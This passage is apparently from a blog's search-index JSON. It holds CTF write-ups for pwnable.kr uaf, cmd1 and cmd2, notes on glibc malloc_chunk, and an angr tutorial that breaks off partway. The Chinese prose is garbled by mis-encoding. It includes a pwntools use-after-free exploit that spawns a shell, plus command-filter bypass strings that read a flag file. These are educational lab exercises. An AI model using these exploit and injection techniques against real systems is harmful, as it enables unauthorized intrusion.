é€šè¿‡ä¸Šé¢çš„åˆ†æï¼ŒçŸ¥é“äº†è°ƒç”¨è™šå‡½æ•°å…¶å®æ˜¯é€šè¿‡åç§»æ¥å®ç°çš„ï¼Œé€šè¿‡+8å¯ä»¥è°ƒç”¨ç¬¬äºŒä¸ªè™šå‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬å¾—åˆ°äº†è™šå‡½æ•°è¡¨åŸºå€ï¼Œå¹¶ä¸”æ”¹å˜ï¼Œå°±å¯ä»¥æ§åˆ¶å‡½æ•°è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„è™šå‡½æ•°ï¼Œè€Œç¨‹åºä¸ºæˆ‘ä»¬å‡†å¤‡äº†è¿™æ ·ä¸€ä¸ªè™šå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ 123virtual void give_shell()&#123; system(&quot;/bin/sh&quot;);&#125; é€šè¿‡IDAæŸ¥æ‰¾åˆ°Personå‡½æ•°çš„è™šè¡¨åœ°å€æ˜¯0x0000000000401590ï¼Œå°†è¿™ä¸ªå€¼-8ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨çš„æ—¶å€™å°±åˆšå¥½å¯ä»¥è°ƒç”¨åˆ°give_shellè¿™ä¸ªå‡½æ•° 123456789101112131415161718# æœ¬æœºexpï¼Œè¿œç¨‹å¤±è´¥å¥½åƒæ˜¯æˆ‘æ²¡æœ‰å†™æ–‡ä»¶çš„æƒé™ï¼Ÿfrom pwn import *vtable_addr = 0x0000000000401550filepath = &#x27;/home/fish/uaf/bash&#x27;#filepath = &#x27;/tmp/f1sh&#x27;write_stream = p64(vtable_addr - 8)with open(filepath, &#x27;wb&#x27;) as fp: fp.write(write_stream)Argv = [&#x27;/home/uaf/uaf&#x27;, &#x27;8&#x27;, filepath]p = process(executable = &#x27;./uaf&#x27;, argv = Argv )p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;3&#x27;)p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;2&#x27;)p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;2&#x27;)p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;1&#x27;)p.interactive() è¿™ä¸ªæ˜¯é“¾æ¥ä¸ŠæœåŠ¡å™¨åæ‰‹åŠ¨getshellå¾—åˆ°çš„ç»“æœ","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"pwn","slug":"ctf/pwn","permalink":"http://example.com/categories/ctf/pwn/"},{"name":"pwnable.kr","slug":"ctf/pwn/pwnable-kr","permalink":"http://example.com/categories/ctf/pwn/pwnable-kr/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr cmd1 cmd2","slug":"ctf/pwn/pwnable/pwnable.kr cmd1 cmd2","date":"2021-07-14T04:44:16.830Z","updated":"2022-01-01T09:54:40.633Z","comments":true,"path":"46930/","link":"","permalink":"http://example.com/46930/","excerpt":"","text":"cmd1linuxPATHå…¥é—¨æ•™å­¦linuxå‘½ä»¤é€šé…ç¬¦putenvå‡½æ•°è®²è§£ è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯å¯¹äºlinuxä¸­shellçš„æ“ä½œï¼Œè¿˜æœ‰PATHç¯å¢ƒçŸ¥è¯†çš„ç†è§£ã€‚æˆ‘å‚è€ƒäº†ä¸Šé¢ä¸‰ç¯‡æ–‡ç« ï¼Œéƒ½å†™å¾—å¾ˆä¸é”™ğŸ‘ã€‚è¿™é‡Œæˆ‘å†™ä¸¤ç§è§£å†³æ–¹æ³• method 1é¦–å…ˆsshç™»å½•ï¼ŒæŸ¥çœ‹æºç  12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;flag&quot;)!=0; r += strstr(cmd, &quot;sh&quot;)!=0; r += strstr(cmd, &quot;tmp&quot;)!=0; return r;&#125;int main(int argc, char* argv[], char** envp)&#123; putenv(&quot;PATH=/thankyouverymuch&quot;); printf(&quot;%s\\n&quot;,getenv(&quot;PATH&quot;)); system(&quot;ls&quot;); if(filter(argv[1])) return 0; system( argv[1] ); return 0;&#125; ç¨‹åºå°†PATHç¯å¢ƒè®¾ç½®æˆäº†ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„å¯¼è‡´ä¸èƒ½ç›´æ¥ä½¿ç”¨å‘½ä»¤ï¼Œè€Œä¸”filterå‡½æ•°è¿‡æ»¤æ‰äº†æˆ‘ä»¬è¾“å…¥çš„ä¸€äº›å­—ç¬¦ã€‚ è¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆæ¥æµ‹è¯•ä¸€ä¸‹PATHå¦‚æœè¢«æ”¹å˜ä¼šæ€ä¹ˆæ ·ï¼Œä¸‹é¢è´´æµ‹è¯•ä»£ç  1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char**argv)&#123; //æ‰“å°æ”¹å˜å‰çš„PATHï¼Œå¹¶ä¸”ä½¿ç”¨å‘½ä»¤ printf(&quot;before PATH: %s\\n&quot;,getenv(&quot;PATH&quot;)); system(argv[1]); //æ”¹å˜PATHï¼Œå°†å…¶è®¾ç½®æˆä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ putenv(&quot;PATH=/aaa&quot;); //å†æ¬¡æ‰“å°è·¯å¾„ printf(&quot;after PATH: %s\\n&quot;, getenv(&quot;PATH&quot;)); system(argv[1]); return 0;&#125; ç¼–è¯‘åè¿è¡Œï¼Œè¿™é‡Œæˆ‘ä»¬æµ‹è¯•çš„å‘½ä»¤æ˜¯ ls ï¼Œå¯ä»¥å‘ç°lså‘½ä»¤å·²ç»å¤±æ•ˆäº†ï¼Œç”±äºPATHçš„è·¯å¾„è¢«ä¸´æ—¶æ”¹å˜ï¼Œéœ€è¦ä½¿ç”¨lså‘½ä»¤çš„ç»å¯¹è·¯å¾„ /bin/ls å†æ¬¡æµ‹è¯•ï¼Œä½¿ç”¨å‘½ä»¤çš„ç»å¯¹è·¯å¾„ /bin/lsï¼Œå¯ä»¥å‘ç°åˆå¯ä»¥æ­£å¸¸è¿è¡Œäº† æ‰€ä»¥è¿™é“é¢˜æˆ‘ä»¬éœ€è¦è¾“å…¥catå‘½ä»¤çš„ç»å¯¹è·¯å¾„ /bin/catï¼Œä½†æ˜¯é—®é¢˜åˆæ¥äº†ï¼Œflagè¿™ä¸ªè¯è¢«è¿‡æ»¤æ‰äº†ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨åˆ°ç»Ÿé…ç¬¦äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ â€œ/bin/cat f*â€œ æˆ–è€… â€œ/bin/cat fla?â€ ç­‰å‘½ä»¤æ¥å®ç°æŸ¥çœ‹flag 12./cmd1 &#x27;/bin/cat fla?&#x27;./cmd1 &#x27;/bin/cat f*&#x27; mommy now I get what PATH environment is for :) method 2ç¬¬äºŒç§æ–¹æ³•æ˜¯æˆ‘ä»¬é‡‡ç”¨shellç¼–ç¨‹æ–¹å¼ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨åˆ©ç”¨ç¨‹åºæ‰“å¼€æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»æ„å­—ç¬¦è€Œä¸å—é™åˆ¶ é¦–å…ˆç°åœ¨æœåŠ¡å™¨çš„/tmp/ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±ä½¿ç”¨çš„ç›®å½•ï¼Œç„¶ååœ¨ç›®å½•ä¸­åˆ›å»ºæˆ‘ä»¬çš„æ–‡ä»¶ï¼Œä¸€ä¼šå„¿éœ€è¦ç”¨ç¨‹åºæ¥è°ƒç”¨ åœ¨åˆ›å»ºbashæ–‡ä»¶ï¼Œæ–‡ä»¶åå­—é‡Œé¢åƒä¸‡ä¸èƒ½å¸¦æœ‰è¿‡æ»¤å­—ç¬¦ï¼ˆæˆ‘è¸©äº†è¿™ä¸ªå‘ğŸ˜¥ï¼‰ï¼Œç„¶åå†™å…¥å‘½ä»¤ è®©ç¨‹åºè°ƒç”¨æ–‡ä»¶ï¼Œä¸€æ ·å¯ä»¥è¾¾åˆ°æ•ˆæœ cmd2 cmd2çš„è€ƒç‚¹ä¸cmd1å¤§åŒå°å¼‚ï¼Œåªæ˜¯è¿™ä¸€æ¬¡æºç ä¸­è¿‡æ»¤äº†æ›´å¤šçš„å­—ç¬¦ï¼Œéœ€è¦æ›´é«˜çš„æŠ€å·§æ‰èƒ½ç»•è¿‡å­—ç¬¦è¿‡æ»¤æ£€æµ‹æ‹¿åˆ°flagï¼Œä¸‹é¢è´´æºç  12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0;&#125; å¯ä»¥çœ‹åˆ°è¿™æ¬¡ç¨‹åºç›´æ¥è¿‡æ»¤äº†â€™/â€˜,â€™.â€™ä¹‹ç±»çš„ç¬¦å·ï¼Œè¿è·¯å¾„éƒ½ä¸è®©ä½¿ç”¨ğŸ’” ä¸‹é¢æˆ‘æä¾›å‡ ç§ç§æ–¹æ³•ï¼ˆç½‘ä¸Šçœ‹åˆ°æ€»ç»“çš„ï¼Œå­¦ä¹ ä¸€æ‰‹ï¼‰ åˆ©ç”¨pwdåˆ©ç”¨$ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å…¥åˆ°æ ¹ç›®å½•ï¼Œç”¨$(pwd)æ¥ä»£æ›¿â€™/â€˜ 123cd //home/cmd2/cmd2 &#x27;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*&#x27;/home/cmd2/cmd2 &quot;\\$(pwd)bin\\$(pwd)cat \\$(pwd)home\\$(pwd)cmd2\\$(pwd)f*&quot; ä¸Šé¢ä¸¤ç§å†™æ³•éƒ½å¯ä»¥ï¼Œè¿™æ˜¯linuxä¸­åŒå¼•å·å’Œå•å¼•å·çš„åŒºåˆ«ï¼Œä¸‹é¢è¿™ç¯‡æ–‡ç« å¯ä»¥äº†è§£ä»–ä»¬ä¹‹é—´çš„åŒºåˆ« Linuxä¸­å•å¼•å·åŒå¼•å·çš„åŒºåˆ«ä¸ç”¨æ³• command -p12&#x27;command -p&#x27; //è¿™æ¡å‘½ä»¤ä¼šå¼ºåˆ¶å°†ç¯å¢ƒå˜ä¸ºé»˜è®¤å€¼ï¼Œå°±ä¸ç”¨ä½¿ç”¨ç»å¯¹è·¯å¾„./cmd2 &#x27;command -p cat f*&#x27; echoè§£æ8è¿›åˆ¶ä¸16è¿›åˆ¶åœ¨ç½‘ä¸Šçœ‹åˆ«äººwpå­¦çš„å…¶å®æˆ‘è§‰å¾—åŸç†å’Œç¬¬ä¸€ä¸ªå·®ä¸å¤ªå¤šï¼Œè¿™ä¸ªæ˜¯åˆ©ç”¨echoå¯ä»¥è§£æ16è¿›åˆ¶å’Œ8è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼ˆä½†æ˜¯ä¸èƒ½ç”¨å‚æ•° -eï¼‰ï¼Œå…·ä½“æƒ…å†µè¦çœ‹ç³»ç»Ÿç‰ˆæœ¬ã€‚ï¼ˆæˆ‘åœ¨ç½‘ä¸Šçœ‹åˆ°ä»–ä»¬åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šechoå‘½ä»¤å¯ä»¥è§£é‡Š8è¿›åˆ¶ï¼Œä½†æˆ‘è¯•äº†è¯•å°±ä¸è¡Œï¼Œè¿˜æ˜¯è®°å½•ä¸‹è¿™ä¸ªæ–¹æ³•ï¼‰ 12345# å°† /bin/cat flag è½¬åŒ–ä¸º8è¿›åˆ¶from pwn import *cmd = &quot;/bin/cat flag&quot;print(&quot;\\\\&quot;+&quot;\\\\&quot;.join([oct(i) for i in ordlist(cmd)]))# \\057\\0142\\0151\\0156\\057\\0143\\0141\\0164\\040\\0146\\0154\\0141\\0147 1./cmd2 &#x27;$(echo &quot;\\057\\0142\\0151\\0156\\057\\0143\\0141\\0164\\040\\0146\\0154\\0141\\0147&quot;)&#x27; æˆ‘çš„æœ¬åœ°è™šæ‹Ÿæœºå°±ä¸å¯ä»¥ç›´æ¥ç”¨echoå‘½ä»¤è½¬ï¼Œéœ€è¦å‚æ•°-e set -så…·ä½“çš„åŸç†è¿˜æ²¡æœ‰åœ¨ç½‘ä¸Šæ‰¾åˆ°ï¼Œç­‰åé¢è¡¥å…… Bash è„šæœ¬ set å‘½ä»¤æ•™ç¨‹ 12./cmd2 &#x27;set -s&#x27;&gt;/bin/cat flag æ€»ç»“ shellç¼–ç¨‹ç‚¹éƒ½ä¸ä¼šï¼Œå…¶å®ä¸Šå­¦æœŸå­¦äº†çš„ï¼Œåªæ˜¯ä¸Šç½‘è¯¾ä¸€ç‚¹éƒ½æ²¡æœ‰è®¤çœŸå¬ã€‚ã€‚æƒ³åœ¨æƒ³èµ·æ¥æœ‰ç‚¹å‚»ï¼Œåé¢éœ€è¦è¡¥ä¹ ä¸‹shellçš„çŸ¥è¯† linuxçš„ä¸œè¥¿å¤ªçµæ´»äº†ã€‚ã€‚å…¶å®ä¸Šé¢çš„ä¸¤é“é¢˜è¿˜æœ‰å‡ ç§å…¶ä»–çš„æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ç²¾åŠ›å’Œæ—¶é—´æœ‰é™ï¼Œåªæ”¶é›†äº†å‡ ç§æˆ‘æ„Ÿè§‰è¿˜å¯ä»¥çš„æ–¹æ³• æˆ‘å¤ªèœäº†ã€‚ã€‚ğŸ¹","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"pwn","slug":"ctf/pwn","permalink":"http://example.com/categories/ctf/pwn/"},{"name":"pwnable.kr","slug":"ctf/pwn/pwnable-kr","permalink":"http://example.com/categories/ctf/pwn/pwnable-kr/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"malloc_chunkç»“æ„ä½“","slug":"ctf/pwn/heap/malloc_chunkç»“æ„","date":"2021-07-14T04:44:16.790Z","updated":"2022-01-01T09:56:38.395Z","comments":true,"path":"19484/","link":"","permalink":"http://example.com/19484/","excerpt":"","text":"æ–‡ç« å‚è€ƒäº†äº†ç½‘ä¸Šçš„ä¸€äº›å¸ˆå‚…æ–‡ç« å†…å®¹ï¼Œæ€»ç»“äº†ä¸€äº›è‡ªå·±çš„ç†è§£ã€‚ malloc_chunkç»“æ„ä½“æˆå‘˜è§£æmalloc_chunkç»“æ„å®šä¹‰ 1234567891011121314151617/* This struct declaration is misleading (but accurate and necessary). It declares a &quot;view&quot; into memory allowing access to necessary fields at known offsets from a given base. See explanation below.*/struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; å„ä¸ªæˆå‘˜çš„ä½œç”¨ prev_size å¦‚æœè¯¥chunkç‰©ç†åœ°å€ç›¸é‚»çš„å‰ä¸€chunk(ä¸¤ä¸ªæŒ‡é’ˆçš„å·®å€¼ä¸ºå‰ä¸€ä¸ªchunkå¤§å°)æ˜¯ç©ºé—²çš„chunkï¼Œè¿™ä¸ªå­—æ®µè®°å½•çš„æ˜¯å‰ä¸€ä¸ªå­—ç¬¦æ®µçš„å¤§å° ç”¨äºå‚¨å­˜ç‰©ç†åœ°å€ç›¸é‚»çš„chunk(ä½åœ°å€chunk)çš„ä¿¡æ¯ è¢«å…±äº«ï¼Œå¦‚æœå½“å‰chunkå¤§ä¸å¤Ÿç”¨ï¼Œå¯ä»¥å ç”¨ä¸‹ä¸€ä¸ªchunkçš„prev_sizeå­—æ®µ size å­˜å‚¨å½“å‰chunkçš„å¤§å°ï¼Œchunkçš„å¤§å°å†…å­˜ç”³è¯·ï¼Œä¸SIZE_SZæœ‰å…³ï¼Œå¦‚æœä¸æ˜¯2*SIZE_SZçš„æ•´æ•°å€ï¼Œä¼šè‡ªåŠ¨å‘ä¸Šå–æ•´åˆ°2*SIZE_SZçš„æ•´æ•°å€ï¼Œ32ä½æ“ä½œç³»ç»Ÿä¸­SIZE_SZæ˜¯32ä½4ä¸ªå­—èŠ‚ï¼Œ64ä½æ“ä½œç³»ç»Ÿä¸­SIZE_SZæ˜¯64ä½8ä¸ªå­—èŠ‚ã€‚32ä½å¿…é¡»8å­—èŠ‚å¯¹é½ï¼Œ64ä½å¿…é¡»16å­—èŠ‚å¯¹é½ï¼Œæ— è®º32ä½è¿˜æ˜¯64ä½ï¼Œsizeæœ€åä¸‰ä½éƒ½æ²¡æœ‰ç”¨ï¼Œæ‰€ç”¨å¯ä»¥ç”¨æ¥å­˜å‚¨å…¶ä»–ä¿¡æ¯ NON_MAIN_ARENA IS_MAPPED è®°å½•å½“å‰chunkæ˜¯å¦æ˜¯ç”±mmapç”³è¯· PREV_INUSE è®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚ fdå’Œbk chunkå¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œfdåœ°å€æ®µå­˜æ”¾çš„æ˜¯ç”¨æˆ·æ•°æ®ã€‚chunkåœ¨ç©ºé—²çš„æ—¶å€™é€šè¿‡é“¾è¡¨ç®¡ç† fdæŒ‡å‘ä¸Šä¸€ä¸ªç©ºé—²ï¼ˆéç‰©ç†ç©ºé—²ï¼‰çš„chunk bkæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²ï¼ˆéç‰©ç†ç©ºé—²ï¼‰çš„chunk fd_nextsizeå’Œbk_nextsize - chunkè¢«ä½¿ç”¨æ—¶å†…å­˜ç»“æ„ 1234567891011121314chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) .next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ chunkè¢«é‡Šæ”¾æ—¶å†…å­˜ç»“æ„ 1234567891011121314151617chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`head:&#x27; | Size of chunk, in bytes |A|0|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`foot:&#x27; | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ å†…å­˜å¯¹é½mallocå‡½æ•°ç”³è¯·çš„chunkåœ°å€éƒ½æ˜¯8å­—èŠ‚æˆ–è€…16å­—èŠ‚å¯¹é½ï¼ˆ32ä½8å­—èŠ‚ï¼Œ64ä½16å­—èŠ‚ï¼‰ï¼Œæ‰€è°“å­—èŠ‚å¯¹é½ï¼Œå°±æ˜¯æ‰€æœ‰çš„åœ°å€æœ€å8ä½æˆ–16ä½éƒ½æ˜¯ä¸€æ ·çš„ï¼ˆå¤§å¤šæ•°æ—¶å€™ä¸º8çš„æ•´æ•°å€ï¼‰ï¼Œå¸¸è§çš„å†…å­˜å¯¹é½æœ‰8å­—èŠ‚å¯¹é½å’Œ16å­—èŠ‚å¯¹é½ 8å­—èŠ‚å¯¹é½ åœ°å€çš„æœ€å8ä½ï¼ˆ2è¿›åˆ¶ä½ï¼‰10è¿›åˆ¶è¡¨ç¤ºä¸º8 16å­—èŠ‚å¯¹é½ åœ°å€çš„æœ€å8ä½ï¼ˆ2è¿›åˆ¶ä½ï¼‰10è¿›åˆ¶è¡¨ç¤ºä¸º0 ä¸‹é¢ç”¨pwndbgå±•ç¤º32ä½ä¸‹chunkå†…å­˜ç»“æ„ pwndbgåˆ†æchunkåœ¨å†…å­˜ä¸­çš„ç»“æ„æµ‹è¯•æºç  12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int* ptr1 = (int*)malloc(8); int* ptr2 = (int*)malloc(16); int* ptr3 = (int*)malloc(32); int* ptr4 = (int*)malloc(64); int* ptr5 = (int*)malloc(128); int* ptr6 = (int*)malloc(256); printf(&quot;ptr1-&gt;%p\\n&quot;, ptr1); printf(&quot;ptr2-&gt;%p\\n&quot;, ptr2); printf(&quot;ptr3-&gt;%p\\n&quot;, ptr3); printf(&quot;ptr4-&gt;%p\\n&quot;, ptr4); printf(&quot;ptr5-&gt;%p\\n&quot;, ptr5); printf(&quot;ptr6-&gt;%p\\n&quot;, ptr6); free(ptr1); free(ptr2); free(ptr3); free(ptr4); free(ptr5); free(ptr6); return 0;&#125; 32ä½ç¨‹åº 64ä½ç¨‹åº heapå‘½ä»¤æŸ¥çœ‹æ‰€æœ‰å †ä¿¡æ¯ åˆ†æäºŒè¿›åˆ¶æ•°æ® 64ä½ç¨‹åºchunkç»“æ„ä¸ä¹‹ç±»ä¼¼","categories":[],"tags":[]},{"title":"angr-1","slug":"ctf/angr/ctf_angr_0","date":"2021-07-14T04:44:16.720Z","updated":"2022-01-01T10:53:07.505Z","comments":true,"path":"17540/","link":"","permalink":"http://example.com/17540/","excerpt":"","text":"ctf_angrä¸€ä¸ªç”¨äºç»ƒä¹ angrçš„ctfé¢˜åº“ï¼Œä»å…¥é—¨åˆ°è¿›é˜¶ï¼ŒåŒæ—¶é…å¥—å…¨è‹±æ–‡pptï¼Œä»ç¬¦å·æ‰§è¡Œåˆ°angrè¯¦ç»†ä½¿ç”¨æ–¹å¼ï¼Œä¸€ç«™å¼å…¥é—¨ğŸ‘ GitHubä¸‹è½½åœ°å€[é“¾æ¥] 00_angr_findidaåˆ†æä¼ªä»£ç éå¸¸ç®€å•,æ‰§è¡Œæµç¨‹ä¸ºï¼šè¾“å…¥-&gt;åŠ å¯†-&gt;æ¯”è¾ƒ-&gt;è¾“å‡ºï¼Œåˆ†æ”¯å°‘ï¼Œæ‰€ä»¥éå†èµ·æ¥é€Ÿåº¦å¾ˆå¿« ä¼ªä»£ç æ˜“è¯»ï¼Œæ•°æ®çš„å­—ç¬¦ä¸²ç»è¿‡complex_functionå‡½æ•°åŠ å¯†è¿‡åæ¯”è¾ƒã€‚ å¦‚æœæŒ‰ç…§ä¼ ç»Ÿçš„æ–¹æ³•ï¼Œéœ€è¦é€†åŠ å¯†ç®—æ³•ç„¶åå†™å‡ºè§£å¯†ç®—æ³•ï¼Œä½†æ˜¯angrä¸éœ€è¦è¿™äº›ç¹ççš„æ“ä½œï¼Œåªéœ€è¦å‘Šè¯‰å…¶å®åœ°å€å’Œç›®æ ‡åœ°å€ï¼Œangrå°±ä¼šè¿›è¡Œæ‰€æœ‰éå†ï¼Œå¯¹ç¬¦å·è¿›è¡Œçº¦æŸï¼Œä»è€Œå¾—å‡ºç»“æœã€‚ angréå†æ±‚è§£é¦–å…ˆè´´å‡ºå…¨ä»£ç ä»¥åŠè¿è¡Œç»“æœï¼Œæœ€åæ‰“å°çš„å€¼å°±æ˜¯å¯¹ç¬¦å·ä¸æ–­çº¦æŸæ±‚è§£å¾—åˆ°çš„ç»“æœ 12345678910111213141516import angrimport sysfilepath = &#x27;/home/fish/æ¡Œé¢/00_angr_find&#x27;project = angr.Project(filepath)initial_state = project.factory.entry_state()print_good_addr = 0x0804867Dsimulation = project.factory.simgr(initial_state)simulation.explore(find = print_good_addr)if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()))else: print(&#x27;Could not find the solution&#x27;) ä½¿ç”¨angrè¿‡ç¨‹ åˆ›å»ºé¡¹ç›® é¦–å…ˆç”¨Projectå‡½æ•°åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼ŒProjectå‚æ•°ä¸ºéœ€è¦æ±‚è§£çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ 1project = angr.Project(filepath) å‘Šè¯‰angrä»å“ªå„¿å¼€å§‹æ‰§è¡Œ entry_state()è¡¨æ˜ä»mainå‡½æ•°å¼€å§‹æ‰§è¡Œï¼ˆä»å¤´å¼€å§‹æ‰§è¡Œï¼‰ 1initial_state = project.factory.entry_state() åˆ›å»ºæ¨¡æ‹Ÿç®¡ç†å™¨ simgræ˜¯åˆ›å»ºå‡½æ•° 1simulation = project.factory.simgr(initial_state) å¼€å§‹æ¢ç´¢äºŒè¿›åˆ¶æ–‡ä»¶ exploreå‡½æ•°éœ€è¦éå†çš„ç»“æŸåœ°å€ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªäºŒè¿›åˆ¶ç¨‹åºä¸­æ‰“å°å­—ç¬¦ä¸²**Good Job.**çš„åœ°å€ã€‚ 12print_good_address = 0x0804867Dsimulation.explore(find=print_good_address) æ£€æŸ¥æ˜¯å¦æ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆ å¦‚æœæ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œfoundä¸ä¸ºç©ºï¼ˆåœ¨pyhonä¸­ç©ºä»£è¡¨falseï¼Œä¸ä¸ºç©ºä»£è¡¨trueï¼‰,å°†è§£å†³æ–¹æ¡ˆæ‰“å°åˆ°å±å¹•è¾“å‡ºç«¯ 12if simulation.found: solution_state = simulation.found[0] æ€»ç»“ä¸»è¦è¿‡ç¨‹åˆ›å»ºå·¥ç¨‹ â€“&gt; æŒ‡å®šæ‰§è¡Œå…¥å£ â€“&gt; åˆ›å»ºäºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œæ¨¡æ‹Ÿå™¨ â€“&gt; æ¢ç´¢å„ä¸ªåˆ†æ”¯ â€“&gt; è§£å‡ºè§£å†³æ–¹æ¡ˆ â€“&gt; æ‰“å°ç»“æœ 01_angr_avoidâ€‹ 